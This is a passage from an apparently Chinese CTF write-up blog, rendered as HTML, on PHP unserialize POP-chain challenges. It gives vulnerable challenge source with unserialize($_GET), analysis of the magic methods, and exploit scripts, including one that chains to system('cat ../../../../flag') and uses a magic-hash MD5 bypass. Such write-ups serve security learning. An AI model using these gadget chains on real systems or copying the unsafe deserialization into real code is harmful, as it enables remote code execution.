<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">__toString</span><span style="color:#d4d4d4">(){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">w00m</span><span style="color:#d4d4d4">-&gt;{</span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">w22m</span><span style="color:#d4d4d4">}();</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">return</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#9cdcfe">$w00m</span><span style="color:#d4d4d4"> = </span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'w00m'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#dcdcaa">unserialize</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$w00m</span><span style="color:#d4d4d4">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">?&gt;</span></span></code></pre></div></div></figure> <p>2. 寻找 pop 链</p> <figure class="php shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="dark-plus shiki"><code><span class="line"><span style="color:#6a9955"># 传参$w00m,直接反序列化，入口就在__destruct，或者_wakeup，这里的w22m符合条件，并且$w00m参数可控,echo触发__toString，__toString方法又当作函数执行，可以触发w44m里的Getflag函数从而输出flag。</span></span>
<span class="line"><span style="color:#6a9955"># w22m.__destruct().w00m-&gt;w33m.__toString().w00m-&gt;w44m.Getflag()</span></span></code></pre></div></div></figure> <p>3. 写 exp</p> <figure class="php shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div><div class="code"><pre class="dark-plus shiki"><code><span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"><span style="color:#569cd6">class</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">w44m</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">private</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$admin</span><span style="color:#d4d4d4">=</span><span style="color:#ce9178">"w44m"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">protected</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$passwd</span><span style="color:#d4d4d4">=</span><span style="color:#ce9178">"08067"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#569cd6">class</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">w22m</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$w00m</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#569cd6">class</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">w33m</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$w00m</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$w22m</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#9cdcfe">$a</span><span style="color:#d4d4d4">=</span><span style="color:#569cd6">new</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">w22m</span><span style="color:#d4d4d4">();</span></span>
<span class="line"><span style="color:#9cdcfe">$b</span><span style="color:#d4d4d4">=</span><span style="color:#569cd6">new</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">w33m</span><span style="color:#d4d4d4">();</span></span>
<span class="line"><span style="color:#9cdcfe">$c</span><span style="color:#d4d4d4">=</span><span style="color:#569cd6">new</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">w44m</span><span style="color:#d4d4d4">();</span></span>
<span class="line"><span style="color:#9cdcfe">$a</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">w00m</span><span style="color:#d4d4d4">=</span><span style="color:#9cdcfe">$b</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#9cdcfe">$b</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">w00m</span><span style="color:#d4d4d4">=</span><span style="color:#9cdcfe">$c</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#9cdcfe">$b</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">w22m</span><span style="color:#d4d4d4">=</span><span style="color:#ce9178">'Getflag'</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">urlencode</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">serialize</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$a</span><span style="color:#d4d4d4">));</span></span></code></pre></div></div></figure> <h3 id="swpu-nss新生赛-ez_1zpop"><a class="markdownIt-Anchor" href="#swpu-nss新生赛-ez_1zpop"></a> [SWPU NSS 新生赛] ez_1zpop</h3> <figure class="php shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></div><div class="code"><pre class="dark-plus shiki"><code><span class="line"><span style="color:#d4d4d4"> &lt;?php</span></span>
<span class="line"><span style="color:#dcdcaa">error_reporting</span><span style="color:#d4d4d4">(</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#569cd6">class</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">dxg</span></span>
<span class="line"><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">   </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">fmm</span><span style="color:#d4d4d4">()</span></span>
<span class="line"><span style="color:#d4d4d4">   {</span></span>
<span class="line"><span style="color:#d4d4d4">      </span><span style="color:#c586c0">return</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">"nonono"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">   }</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#569cd6">class</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">lt</span></span>
<span class="line"><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">   </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$impo</span><span style="color:#d4d4d4">=</span><span style="color:#ce9178">'hi'</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">   </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$md51</span><span style="color:#d4d4d4">=</span><span style="color:#ce9178">'weclome'</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">   </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$md52</span><span style="color:#d4d4d4">=</span><span style="color:#ce9178">'to NSS'</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">   </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">__construct</span><span style="color:#d4d4d4">()</span></span>
<span class="line"><span style="color:#d4d4d4">   {</span></span>
<span class="line"><span style="color:#d4d4d4">      </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">impo</span><span style="color:#d4d4d4"> = </span><span style="color:#569cd6">new</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">dxg</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">   }</span></span>
<span class="line"><span style="color:#d4d4d4">   </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">__wakeup</span><span style="color:#d4d4d4">()</span></span>
<span class="line"><span style="color:#d4d4d4">   {</span></span>
<span class="line"><span style="color:#d4d4d4">      </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">impo</span><span style="color:#d4d4d4"> = </span><span style="color:#569cd6">new</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">dxg</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">      </span><span style="color:#c586c0">return</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">impo</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#dcdcaa">fmm</span><span style="color:#d4d4d4">();</span></span>
<span class="line"><span style="color:#d4d4d4">   }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">   </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">__toString</span><span style="color:#d4d4d4">()</span></span>
<span class="line"><span style="color:#d4d4d4">   {</span></span>
<span class="line"><span style="color:#d4d4d4">      </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4"> (</span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">impo</span><span style="color:#d4d4d4">) &amp;&amp; </span><span style="color:#dcdcaa">md5</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">md51</span><span style="color:#d4d4d4">) == </span><span style="color:#dcdcaa">md5</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">md52</span><span style="color:#d4d4d4">) &amp;&amp; </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">md51</span><span style="color:#d4d4d4"> != </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">md52</span><span style="color:#d4d4d4">)</span></span>
<span class="line"><span style="color:#d4d4d4">         </span><span style="color:#c586c0">return</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">impo</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#dcdcaa">fmm</span><span style="color:#d4d4d4">();</span></span>
<span class="line"><span style="color:#d4d4d4">   }</span></span>
<span class="line"><span style="color:#d4d4d4">   </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">__destruct</span><span style="color:#d4d4d4">()</span></span>
<span class="line"><span style="color:#d4d4d4">   {</span></span>
<span class="line"><span style="color:#d4d4d4">      </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">   }</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#569cd6">class</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">fin</span></span>
<span class="line"><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">   </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$a</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">   </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$url</span><span style="color:#d4d4d4"> = </span><span style="color:#ce9178">'https://www.ctfer.vip'</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">   </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$title</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">   </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">fmm</span><span style="color:#d4d4d4">()</span></span>
<span class="line"><span style="color:#d4d4d4">   {</span></span>
<span class="line"><span style="color:#d4d4d4">      </span><span style="color:#9cdcfe">$b</span><span style="color:#d4d4d4"> = </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">a</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">      </span><span style="color:#9cdcfe">$b</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">title</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">   }</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4"> (</span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'NSS'</span><span style="color:#d4d4d4">])) {</span></span>
<span class="line"><span style="color:#d4d4d4">   </span><span style="color:#9cdcfe">$Data</span><span style="color:#d4d4d4"> = </span><span style="color:#dcdcaa">unserialize</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'NSS'</span><span style="color:#d4d4d4">]);</span></span>
<span class="line"><span style="color:#d4d4d4">} </span><span style="color:#c586c0">else</span><span style="color:#d4d4d4"> {</span></span>
<span class="line"><span style="color:#d4d4d4">   </span><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__file__</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span></code></pre></div></div></figure> <p>2. 找 pop 链，注意里面的细节</p> <figure class="shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="dark-plus shiki"><code><span class="line"><span style="color:#d4d4d4">找一下魔术方法__wakeup，__toString，__destruct，想一下他们的触发方式。</span></span>
<span class="line"><span style="color:#d4d4d4">__destruct()	//对象被销毁时触发</span></span>
<span class="line"><span style="color:#d4d4d4">__wakeup()		//在使用unserialize()时，会检查是否存在一个__wakeup()魔术方法。如果存在，则该方法会先被调用，预先准备对象需要的资源。</span></span>
<span class="line"><span style="color:#d4d4d4">__toString()	//方法在将一个对象转化成字符串时自动调用，比如使用echo打印对象时</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4">再去读一下__wakeup()方法，因为这个方法是可能可以做入口的，发现里面代码执行的是fmm函数，而fmm函数返回的是dxg类里的"nonono",代表这题是要绕过__wakeup方法的，不让它执行。</span></span>
<span class="line"><span style="color:#d4d4d4">再去看__destruct函数，里面执行的是echo语句，可以触发__tostring方法。</span></span>
<span class="line"><span style="color:#d4d4d4">再去找一下出口，看到还有一个函数，是fin类里面的fmm函数，看fin类里面可以命令执行。现在思路就清晰了。</span></span>
<span class="line"><span style="color:#d4d4d4">__destruct()-&gt;__toString()-&gt;fin.fmm();</span></span></code></pre></div></div></figure> <p>3.exp</p> <figure class="php shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div><div class="code"><pre class="dark-plus shiki"><code><span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"><span style="color:#569cd6">class</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">dxg</span></span>
<span class="line"><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">fmm</span><span style="color:#d4d4d4">()</span></span>
<span class="line"><span style="color:#d4d4d4">    {</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">return</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">"nonono"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#569cd6">class</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">lt</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$impo</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$md51</span><span style="color:#d4d4d4">=</span><span style="color:#ce9178">'QNKCDZO'</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$md52</span><span style="color:#d4d4d4">=</span><span style="color:#ce9178">'240610708'</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#569cd6">class</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">fin</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$a</span><span style="color:#d4d4d4">=</span><span style="color:#ce9178">"system"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$url</span><span style="color:#d4d4d4"> = </span><span style="color:#ce9178">'https://www.ctfer.vip'</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$title</span><span style="color:#d4d4d4">=</span><span style="color:#ce9178">"cat ../../../../flag"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#9cdcfe">$a</span><span style="color:#d4d4d4">=</span><span style="color:#569cd6">new</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">dxg</span><span style="color:#d4d4d4">();</span></span>
<span class="line"><span style="color:#9cdcfe">$nss</span><span style="color:#d4d4d4">=</span><span style="color:#569cd6">new</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">lt</span><span style="color:#d4d4d4">();</span></span>
<span class="line"><span style="color:#9cdcfe">$c</span><span style="color:#d4d4d4">=</span><span style="color:#569cd6">new</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">fin</span><span style="color:#d4d4d4">();</span></span>
<span class="line"><span style="color:#9cdcfe">$nss</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">impo</span><span style="color:#d4d4d4">=</span><span style="color:#9cdcfe">$c</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> (</span><span style="color:#dcdcaa">serialize</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$nss</span><span style="color:#d4d4d4">));</span></span></code></pre></div></div></figure> <h3 id="newstar新生赛-unserializeone"><a class="markdownIt-Anchor" href="#newstar新生赛-unserializeone"></a> NewStar 新生赛 UnserializeOne</h3> <figure class="php shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></div><div class="code"><pre class="dark-plus shiki"><code><span class="line"><span style="color:#d4d4d4"> &lt;?php</span></span>
<span class="line"><span style="color:#dcdcaa">error_reporting</span><span style="color:#d4d4d4">(</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#6a9955">#Something useful for you : https://zhuanlan.zhihu.com/p/377676274</span></span>
<span class="line"><span style="color:#569cd6">class</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">Start</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$name</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">protected</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$func</span><span style="color:#d4d4d4">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">__destruct</span><span style="color:#d4d4d4">()</span></span>
<span class="line"><span style="color:#d4d4d4">    {</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">"Welcome to NewStarCTF, "</span><span style="color:#d4d4d4">.</span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">name</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">__isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$var</span><span style="color:#d4d4d4">)</span></span>
<span class="line"><span style="color:#d4d4d4">    {</span></span>
<span class="line"><span style="color:#d4d4d4">        (</span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">func</span><span style="color:#d4d4d4">)();</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#569cd6">class</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">Sec</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">private</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$obj</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">private</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$var</span><span style="color:#d4d4d4">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">__toString</span><span style="color:#d4d4d4">()</span></span>
<span class="line"><span style="color:#d4d4d4">    {</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">obj</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#dcdcaa">check</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">var</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">return</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">"CTFers"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">__invoke</span><span style="color:#d4d4d4">()</span></span>
<span class="line"><span style="color:#d4d4d4">    {</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">file_get_contents</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'/flag'</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#569cd6">class</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">Easy</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$cla</span><span style="color:#d4d4d4">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">__call</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$fun</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$var</span><span style="color:#d4d4d4">)</span></span>
<span class="line"><span style="color:#d4d4d4">    {</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">cla</span><span style="color:#d4d4d4"> = </span><span style="color:#569cd6">clone</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$var</span><span style="color:#d4d4d4">[</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
